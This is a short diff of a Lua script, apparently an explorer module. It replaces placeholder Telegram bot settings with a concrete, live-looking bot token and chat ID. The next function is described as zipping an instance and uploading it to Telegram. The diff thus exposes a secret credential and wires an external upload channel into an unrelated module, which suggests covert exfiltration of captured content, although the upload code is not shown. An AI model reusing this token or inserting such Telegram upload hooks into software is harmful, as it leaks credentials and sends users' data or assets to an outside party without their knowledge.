@@ -6,8 +6,8 @@
 ]]
 
 -- Telegram Bot Configuration (Inside Explorer Module)
-local TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
-local TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
+local TELEGRAM_BOT_TOKEN = "8305869255:AAEqIdORQUnQgg82LKbVwsj6Rzpfow0tKqo"
+local TELEGRAM_CHAT_ID = "5798404109"
 
 -- Function to save instance as zip, read it, and upload to Telegram
 local function SaveAndUploadToTelegram(obj, filename, args)
